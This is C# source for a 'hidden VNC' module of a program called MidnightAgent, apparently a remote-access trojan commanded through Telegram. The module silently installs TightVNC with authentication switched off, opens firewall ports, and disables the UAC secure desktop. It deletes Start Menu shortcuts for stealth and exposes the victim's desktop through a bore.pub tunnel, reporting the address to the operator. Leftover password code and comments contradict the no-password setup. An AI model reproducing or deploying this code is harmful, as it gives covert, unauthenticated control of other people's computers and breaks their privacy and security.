using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Telegram;
using MidnightAgent.Utils;

namespace MidnightAgent.Features
{
    /// <summary>
    /// VNC Feature - Deploy Hidden VNC (TightVNC + Bore Tunnel)
    /// No password required - connects directly without authentication
    /// </summary>
    public class VncFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "vnc";
        public string Description => "Deploy Hidden VNC (TightVNC + Bore)";
        public string Usage => "/vnc start | stop";

        // ===== Configuration =====
        private const string TIGHTVNC_MSI_URL = "https://www.tightvnc.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit.msi";
        private const string BORE_URL = "https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip";
        private const string BORE_SERVER = "bore.pub";
        
        private static readonly SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
        private readonly string WorkingDir = @"C:\Users\Public\MidnightVnc";
        
        private static Process _boreProcess;

        // ===== Main Entry Point =====
        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0) return FeatureResult.Fail(Usage);
            string action = args[0].ToLower();

            if (!_lock.Wait(0))
                return FeatureResult.Fail("⚠️ VNC Task is busy.");

            try
            {
                if (action == "start")
                {
                    if (TelegramInstance == null)
                        return FeatureResult.Fail("⚠️ Agent needs restart.");

                    TelegramInstance?.SendMessage("🚀 <b>Starting VNC...</b>");

                    _ = Task.Run(async () =>
                    {
                        try { await StartVnc(); }
                        catch (Exception ex)
                        {
                            TelegramInstance?.SendMessage($"❌ VNC Error: {ex.Message}");
                        }
                        finally { _lock.Release(); }
                    });

                    return FeatureResult.Ok("VNC deployment started.");
                }
                else if (action == "stop")
                {
                    await Task.Run(() => StopVnc(false));
                    _lock.Release();
                    return FeatureResult.Ok("VNC stopped.");
                }
            }
            catch (Exception ex)
            {
                _lock.Release();
                return FeatureResult.Fail($"Error: {ex.Message}");
            }

            _lock.Release();
            return FeatureResult.Fail(Usage);
        }

        // ===== Main VNC Start Sequence =====
        private async Task StartVnc()
        {
            string logPath = Path.Combine(WorkingDir, "vnc_debug.log");
            string log = $"[{DateTime.Now}] Starting VNC\n";

            try
            {
                // Step 1: Cleanup
                StopVnc(true);
                if (!Directory.Exists(WorkingDir)) 
                    Directory.CreateDirectory(WorkingDir);

                string tvnPath = @"C:\Program Files\TightVNC\tvnserver.exe";
                string boreExe = Path.Combine(WorkingDir, "bore.exe");

                // Step 2: Install TightVNC if needed
                if (!File.Exists(tvnPath))
                {
                    TelegramInstance?.SendMessage("⬇️ <b>(1/4) Installing TightVNC...</b>");
                    await InstallTightVnc();
                    
                    // Check both paths
                    if (!File.Exists(tvnPath))
                        tvnPath = @"C:\Program Files (x86)\TightVNC\tvnserver.exe";
                    
                    if (!File.Exists(tvnPath))
                        throw new Exception("TightVNC installation failed");
                    
                    // STEALTH: Remove Start Menu shortcuts
                    RemoveStartMenuShortcuts();
                }
                else
                {
                    TelegramInstance?.SendMessage("✅ <b>(1/4) TightVNC Ready</b>");
                }
                log += $"TightVNC: {tvnPath}\n";

                // Step 3: Download Bore if needed
                if (!File.Exists(boreExe))
                {
                    TelegramInstance?.SendMessage("⬇️ <b>(2/4) Downloading Bore...</b>");
                    await DownloadBore();
                }
                else
                {
                    TelegramInstance?.SendMessage("✅ <b>(2/4) Bore Ready</b>");
                }

                // Step 4: Configure Registry + Firewall
                TelegramInstance?.SendMessage("⚙️ <b>(3/4) Configuring...</b>");
                
                // ADD FIREWALL RULES FIRST to prevent popup!
                string tvnExePath = tvnPath;
                RunCmd("netsh", "advfirewall firewall delete rule name=\"TightVNC Server\"", 3000);
                RunCmd("netsh", "advfirewall firewall delete rule name=\"TightVNC\"", 3000);
                RunCmd("netsh", $"advfirewall firewall add rule name=\"TightVNC Server\" dir=in action=allow program=\"{tvnExePath}\" enable=yes profile=any", 5000);
                RunCmd("netsh", $"advfirewall firewall add rule name=\"TightVNC Server\" dir=out action=allow program=\"{tvnExePath}\" enable=yes profile=any", 5000);
                RunCmd("netsh", "advfirewall firewall add rule name=\"VNC Port\" dir=in action=allow protocol=tcp localport=5900 enable=yes profile=any", 5000);
                RunCmd("netsh", "advfirewall firewall add rule name=\"VNC Port\" dir=out action=allow protocol=tcp localport=5900 enable=yes profile=any", 5000);
                log += "Firewall rules added\n";
                
                // Configure HKCU registry
                ConfigureRegistry();
                
                // Wait for registry to be configured (CRITICAL!)
                string markerPath = Path.Combine(WorkingDir, "reg_done.txt");
                bool regConfigured = File.Exists(markerPath);
                log += $"Registry configured: {regConfigured}\n";
                
                // Extra delay to ensure registry is fully applied
                await Task.Delay(3000);

                // Step 5: Start VNC as SERVICE (runs as SYSTEM with admin privileges)
                // This allows VNC to see UAC prompts
                TelegramInstance?.SendMessage("🖥️ <b>(4/4) Starting VNC Service...</b>");
                
                // Stop any existing VNC
                RunCmd("net", "stop tvnserver", 5000);
                RunCmd(tvnPath, "-remove -silent", 5000);
                KillProcess("tvnserver");
                await Task.Delay(1000);
                
                // Install TightVNC as Windows Service
                log += "Installing VNC service...\n";
                RunCmd(tvnPath, "-install -silent", 10000);
                await Task.Delay(2000);
                
                // Start the service
                log += "Starting VNC service...\n";
                RunCmd("net", "start tvnserver", 10000);
                await Task.Delay(3000);
                
                // CRITICAL: Connect service to active console session
                // This makes the service see the user's desktop instead of Session 0
                log += "Connecting service to user session...\n";
                RunCmd(tvnPath, "-controlservice -connect", 5000);
                await Task.Delay(2000);
                
                bool vncRunning = Process.GetProcessesByName("tvnserver").Length > 0;
                log += $"VNC running: {vncRunning}\n";
                
                // Fallback: Try direct ProcessHelper
                if (!vncRunning)
                {
                    log += "Task failed, trying ProcessHelper...\n";
                    ProcessHelper.StartProcessAsCurrentUser(tvnPath, "-run", Path.GetDirectoryName(tvnPath), false);
                    await Task.Delay(3000);
                    vncRunning = Process.GetProcessesByName("tvnserver").Length > 0;
                }

                if (!vncRunning)
                {
                    File.WriteAllText(logPath, log);
                    TelegramInstance?.SendMessage("❌ <b>VNC Failed to Start</b>");
                    return;
                }

                TelegramInstance?.SendMessage("✅ <b>VNC Running</b>");
                log += "VNC running\n";

                // Step 6: Start Bore Tunnel
                TelegramInstance?.SendMessage("🚇 <b>Creating Tunnel...</b>");
                string tunnelUrl = await StartBoreTunnel(boreExe);
                
                if (!string.IsNullOrEmpty(tunnelUrl))
                {
                    TelegramInstance?.SendMessage(
                        $"✅ <b>VNC ACTIVE</b>\n\n" +
                        $"📡 <b>URL:</b> <code>{tunnelUrl}</code>\n" +
                        $"🔓 <b>Password:</b> <i>None</i>\n" +
                        $"⚠️ <i>Connect with TightVNC Viewer</i>"
                    );
                    log += $"Tunnel: {tunnelUrl}\n";
                }
                else
                {
                    TelegramInstance?.SendMessage("❌ <b>Tunnel Failed</b>");
                    StopVnc(true);
                }

                File.WriteAllText(logPath, log);
            }
            catch (Exception ex)
            {
                log += $"Error: {ex}\n";
                File.WriteAllText(logPath, log);
                TelegramInstance?.SendMessage($"❌ Error: {ex.Message}");
                StopVnc(true);
            }
        }

        // ===== Install TightVNC =====
        private async Task InstallTightVnc()
        {
            string msiPath = Path.Combine(WorkingDir, "tightvnc.msi");
            
            using (var client = new WebClient())
            {
                await client.DownloadFileTaskAsync(TIGHTVNC_MSI_URL, msiPath);
            }

            // Silent install - Server only, No authentication
            var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "msiexec",
                Arguments = $"/i \"{msiPath}\" /quiet /norestart " +
                           "ADDLOCAL=Server " +
                           "SET_USEVNCAUTHENTICATION=0 " +
                           "SET_USECONTROLAUTHENTICATION=0 " +
                           "SET_ALLOWLOOPBACK=1 " +
                           "SET_LOOPBACKONLY=0",
                CreateNoWindow = true,
                UseShellExecute = false
            });
            
            proc?.WaitForExit(120000);
            await Task.Delay(3000);
        }

        // ===== Remove Start Menu Shortcuts for Stealth =====
        private void RemoveStartMenuShortcuts()
        {
            try
            {
                // Common Start Menu locations for TightVNC shortcuts
                string[] startMenuPaths = new[]
                {
                    // All Users
                    @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\TightVNC",
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu) + @"\Programs\TightVNC",
                    
                    // Current User
                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\Programs\TightVNC",
                    Environment.GetFolderPath(Environment.SpecialFolder.Programs) + @"\TightVNC"
                };

                foreach (string path in startMenuPaths)
                {
                    if (Directory.Exists(path))
                    {
                        Directory.Delete(path, true); // Delete folder and all contents
                    }
                }

                // Also remove individual shortcuts if they exist
                string[] shortcutPaths = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu) + @"\Programs\TightVNC Server.lnk",
                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\Programs\TightVNC Server.lnk",
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\TightVNC Server.lnk"
                };

                foreach (string shortcut in shortcutPaths)
                {
                    if (File.Exists(shortcut))
                    {
                        File.Delete(shortcut);
                    }
                }
            }
            catch
            {
                // Ignore errors - shortcuts might not exist
            }
        }

        // ===== Download Bore =====
        private async Task DownloadBore()
        {
            string zipPath = Path.Combine(WorkingDir, "bore.zip");
            
            using (var client = new WebClient())
            {
                await client.DownloadFileTaskAsync(BORE_URL, zipPath);
            }
            
            ZipFile.ExtractToDirectory(zipPath, WorkingDir);
        }

        // VNC Password - change this to any password you want (max 8 characters)
        private const string VNC_PASSWORD = "1234";
        
        // ===== Configure Registry - WITH PASSWORD =====
        // TightVNC REQUIRES password authentication to accept connections
        // ===== Configure Registry - BOTH HKLM and HKCU =====
        private void ConfigureRegistry()
        {
            // Generate encrypted password
            string encryptedPwd = EncryptVncPassword(VNC_PASSWORD);
            
            // 1. Configure HKLM (System-wide) using RunCmd
            ConfigureHklm(encryptedPwd);

            // 2. Configure HKCU (User-specific) using ProcessHelper
            ConfigureHkcu(encryptedPwd);
        }

        private void ConfigureHklm(string encryptedPwd)
        {
            try 
            {
                // UAC Fix
                RunCmd("reg", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f", 3000);

                // TightVNC HKLM Settings
                string key = "HKLM\\Software\\TightVNC\\Server";
                RunCmd("reg", $"delete \"{key}\" /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v AcceptRfbConnections /t REG_DWORD /d 1 /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v RfbPort /t REG_DWORD /d 5900 /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v AllowLoopback /t REG_DWORD /d 1 /f", 3000); // CRITICAL
                RunCmd("reg", $"add \"{key}\" /v LoopbackOnly /t REG_DWORD /d 0 /f", 3000);
                // NO PASSWORD - Disable authentication
                RunCmd("reg", $"add \"{key}\" /v UseVncAuthentication /t REG_DWORD /d 0 /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v UseControlAuthentication /t REG_DWORD /d 0 /f", 3000);
                RunCmd("reg", $"delete \"{key}\" /v Password /f", 3000);
                RunCmd("reg", $"delete \"{key}\" /v PasswordViewOnly /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v AlwaysShared /t REG_DWORD /d 1 /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v GrabTransparentWindows /t REG_DWORD /d 1 /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v RunControlInterface /t REG_DWORD /d 0 /f", 3000);
                RunCmd("reg", $"add \"{key}\" /v RemoveWallpaper /t REG_DWORD /d 0 /f", 3000); // Keep wallpaper!
            }
            catch {}
        }

        private void ConfigureHkcu(string encryptedPwd)
        {
            // Create a batch file to set HKCU settings
            // This MUST be run as the current user
            string batPath = Path.Combine(WorkingDir, "config_hkcu.bat");
            string markerPath = Path.Combine(WorkingDir, "hkcu_done.txt");
            if (File.Exists(markerPath)) File.Delete(markerPath);

            string key = "HKCU\\Software\\TightVNC\\Server";
            
            string batContent = $@"@echo off
reg delete ""{key}"" /f >nul 2>&1
reg add ""{key}"" /v AcceptRfbConnections /t REG_DWORD /d 1 /f >nul
reg add ""{key}"" /v RfbPort /t REG_DWORD /d 5900 /f >nul
reg add ""{key}"" /v AllowLoopback /t REG_DWORD /d 1 /f >nul
reg add ""{key}"" /v LoopbackOnly /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v UseVncAuthentication /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v UseControlAuthentication /t REG_DWORD /d 0 /f >nul
reg delete ""{key}"" /v Password /f >nul 2>&1
reg delete ""{key}"" /v PasswordViewOnly /f >nul 2>&1
reg add ""{key}"" /v AlwaysShared /t REG_DWORD /d 1 /f >nul
reg add ""{key}"" /v NeverShared /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v DisconnectClients /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v GrabTransparentWindows /t REG_DWORD /d 1 /f >nul
reg add ""{key}"" /v UseMirrorDriver /t REG_DWORD /d 1 /f >nul
reg add ""{key}"" /v PollingInterval /t REG_DWORD /d 30 /f >nul
reg add ""{key}"" /v LocalInputPriority /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v BlockRemoteInput /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v RunControlInterface /t REG_DWORD /d 0 /f >nul
reg add ""{key}"" /v RemoveWallpaper /t REG_DWORD /d 0 /f >nul
echo done > ""{markerPath}""
";
            try 
            {
                File.WriteAllText(batPath, batContent);
                ProcessHelper.StartProcessAsCurrentUser("cmd.exe", $"/c \"{batPath}\"", WorkingDir, false);
                
                // Wait for the marker
                for (int i = 0; i < 20; i++)
                {
                    if (File.Exists(markerPath)) break;
                    Thread.Sleep(200);
                }
            }
            catch {}
        }
        // ===== Configure HKLM Registry for Service Mode =====
        private void ConfigureServiceRegistry(string tvnPath)
        {
            // Service mode uses HKLM registry
            string[] settings = new[]
            {
                // Connection
                "add \"HKLM\\Software\\TightVNC\\Server\" /v AcceptRfbConnections /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v RfbPort /t REG_DWORD /d 5900 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v AllowLoopback /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v LoopbackOnly /t REG_DWORD /d 0 /f",
                
                // Password 1234 (DES encrypted)
                "add \"HKLM\\Software\\TightVNC\\Server\" /v UseVncAuthentication /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v UseControlAuthentication /t REG_DWORD /d 0 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v Password /t REG_BINARY /d 8b4c4b58534d5e7b /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v PasswordViewOnly /t REG_BINARY /d 8b4c4b58534d5e7b /f",
                
                // Session
                "add \"HKLM\\Software\\TightVNC\\Server\" /v AlwaysShared /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v NeverShared /t REG_DWORD /d 0 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v DisconnectClients /t REG_DWORD /d 0 /f",
                
                // Screen capture
                "add \"HKLM\\Software\\TightVNC\\Server\" /v GrabTransparentWindows /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v UseMirrorDriver /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v PollingInterval /t REG_DWORD /d 30 /f",
                
                // Input
                "add \"HKLM\\Software\\TightVNC\\Server\" /v LocalInputPriority /t REG_DWORD /d 0 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v BlockRemoteInput /t REG_DWORD /d 0 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v BlockLocalInput /t REG_DWORD /d 0 /f",
                
                // Auto accept
                "add \"HKLM\\Software\\TightVNC\\Server\" /v QueryTimeout /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v QueryAcceptOnTimeout /t REG_DWORD /d 1 /f",
                
                // UI
                "add \"HKLM\\Software\\TightVNC\\Server\" /v RunControlInterface /t REG_DWORD /d 1 /f",
                "add \"HKLM\\Software\\TightVNC\\Server\" /v RemoveWallpaper /t REG_DWORD /d 0 /f",
            };

            foreach (var setting in settings)
            {
                RunCmd("reg", setting, 2000);
            }
        }

        // ===== Start Bore Tunnel =====
        private async Task<string> StartBoreTunnel(string boreExe)
        {
            string logPath = Path.Combine(WorkingDir, "bore_debug.log");
            string boreLog = $"[{DateTime.Now}] Starting Bore\n";
            string url = null;
            
            _boreProcess = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = boreExe,
                    Arguments = $"local 5900 --to {BORE_SERVER}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            // Event handlers for output
            _boreProcess.OutputDataReceived += (s, e) =>
            {
                if (e.Data != null)
                {
                    boreLog += $"stdout: {e.Data}\n";
                    if (url == null)
                    {
                        var match = Regex.Match(e.Data, @"(bore\.pub:\d+)");
                        if (match.Success) url = match.Groups[1].Value;
                    }
                }
            };
            
            _boreProcess.ErrorDataReceived += (s, e) =>
            {
                if (e.Data != null)
                {
                    boreLog += $"stderr: {e.Data}\n";
                    if (url == null)
                    {
                        var match = Regex.Match(e.Data, @"(bore\.pub:\d+)");
                        if (match.Success) url = match.Groups[1].Value;
                    }
                }
            };
            
            _boreProcess.Start();
            _boreProcess.BeginOutputReadLine();
            _boreProcess.BeginErrorReadLine();
            boreLog += $"Bore started PID: {_boreProcess.Id}\n";

            // Wait for URL to be found (max 15 seconds)
            for (int i = 0; i < 30 && url == null; i++)
            {
                await Task.Delay(500);
                if (_boreProcess.HasExited)
                {
                    boreLog += $"Bore exited: {_boreProcess.ExitCode}\n";
                    break;
                }
            }

            boreLog += $"Final URL: {url}\n";
            File.WriteAllText(logPath, boreLog);
            
            return url;
        }

        // ===== Stop VNC =====
        private void StopVnc(bool silent)
        {
            try
            {
                // 1. Kill bore tunnel process
                if (_boreProcess != null && !_boreProcess.HasExited)
                {
                    try { _boreProcess.Kill(); } catch { }
                    _boreProcess = null;
                }

                // 2. Stop TightVNC service (if running as service)
                RunCmd("net", "stop tvnserver", 5000);
                
                // 3. Remove TightVNC service
                string tvnPath = @"C:\Program Files\TightVNC\tvnserver.exe";
                if (!File.Exists(tvnPath))
                    tvnPath = @"C:\Program Files (x86)\TightVNC\tvnserver.exe";
                if (File.Exists(tvnPath))
                {
                    RunCmd(tvnPath, "-remove -silent", 5000);
                }
                
                // 4. Delete scheduled task
                RunCmd("schtasks", "/delete /tn \"MidnightVNC\" /f", 5000);
                
                // 5. Force kill all VNC and Bore processes using taskkill
                RunCmd("taskkill", "/F /IM tvnserver.exe", 3000);
                RunCmd("taskkill", "/F /IM bore.exe", 3000);
                
                // 6. Also kill using .NET method as backup
                KillProcess("tvnserver");
                KillProcess("bore");
                
                // 7. REMOVE START MENU SHORTCUTS
                RemoveStartMenuShortcuts();
                
                // 8. REMOVE STARTUP ENTRIES
                RemoveStartupEntries();
                
                // 9. Re-enable UAC Secure Desktop (Cleanup)
                RunCmd("reg", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f", 3000);

                // 10. Wait a bit for processes to fully terminate
                Thread.Sleep(1000);
                
                // 11. Verify processes are stopped
                bool tvnStopped = Process.GetProcessesByName("tvnserver").Length == 0;
                bool boreStopped = Process.GetProcessesByName("bore").Length == 0;
                
                if (!silent)
                {
                    if (tvnStopped && boreStopped)
                    {
                        TelegramInstance?.SendMessage("🛑 <b>VNC Stopped Successfully</b>");
                    }
                    else
                    {
                        string remaining = "";
                        if (!tvnStopped) remaining += "tvnserver ";
                        if (!boreStopped) remaining += "bore";
                        TelegramInstance?.SendMessage($"⚠️ <b>VNC Stop:</b> Some processes still running: {remaining}");
                    }
                }
            }
            catch (Exception ex)
            {
                if (!silent)
                    TelegramInstance?.SendMessage($"❌ VNC Stop Error: {ex.Message}");
            }
        }
        
        // ===== Remove Startup Entries =====
        private void RemoveStartupEntries()
        {
            try
            {
                // Remove from registry startup (HKLM)
                RunCmd("reg", "delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TightVNC /f", 3000);
                RunCmd("reg", "delete \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TightVNC /f", 3000);
                
                // Remove from registry startup (HKCU)
                RunCmd("reg", "delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TightVNC /f", 3000);
                
                // Remove from Startup folder
                string[] startupFolders = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup)
                };

                foreach (string folder in startupFolders)
                {
                    try
                    {
                        if (Directory.Exists(folder))
                        {
                            foreach (string file in Directory.GetFiles(folder, "*TightVNC*.lnk"))
                            {
                                File.Delete(file);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // ===== Helper Methods =====
        private void KillProcess(string name)
        {
            try
            {
                foreach (var p in Process.GetProcessesByName(name))
                {
                    try { p.Kill(); } catch { }
                }
            }
            catch { }
        }

        private void RunCmd(string exe, string args, int timeout)
        {
            try
            {
                var p = Process.Start(new ProcessStartInfo
                {
                    FileName = exe,
                    Arguments = args,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                p?.WaitForExit(timeout);
            }
            catch { }
        }

        /// <summary>
        /// Encrypt password using TightVNC DES algorithm
        /// VNC uses a fixed key and bit-reversal on the password
        /// </summary>
        private string EncryptVncPassword(string password)
        {
            // VNC fixed DES key (well-known, used by all VNC implementations)
            byte[] vncKey = { 0xE8, 0x4A, 0xD6, 0x60, 0xC4, 0x72, 0x1A, 0xE0 };
            
            // Pad password to 8 bytes with nulls
            byte[] pwdBytes = new byte[8];
            byte[] inputBytes = Encoding.ASCII.GetBytes(password);
            Array.Copy(inputBytes, pwdBytes, Math.Min(inputBytes.Length, 8));
            
            // VNC requires bit-reversal on each byte of the key
            byte[] reversedKey = new byte[8];
            for (int i = 0; i < 8; i++)
            {
                byte b = vncKey[i];
                byte reversed = 0;
                for (int j = 0; j < 8; j++)
                {
                    reversed |= (byte)(((b >> j) & 1) << (7 - j));
                }
                reversedKey[i] = reversed;
            }
            
            // Create DES encryptor
            using (var des = DES.Create())
            {
                des.Mode = CipherMode.ECB;
                des.Padding = PaddingMode.None;
                des.Key = reversedKey;
                
                using (var encryptor = des.CreateEncryptor())
                {
                    byte[] encrypted = encryptor.TransformFinalBlock(pwdBytes, 0, 8);
                    return BitConverter.ToString(encrypted).Replace("-", "").ToLower();
                }
            }
        }
    }
}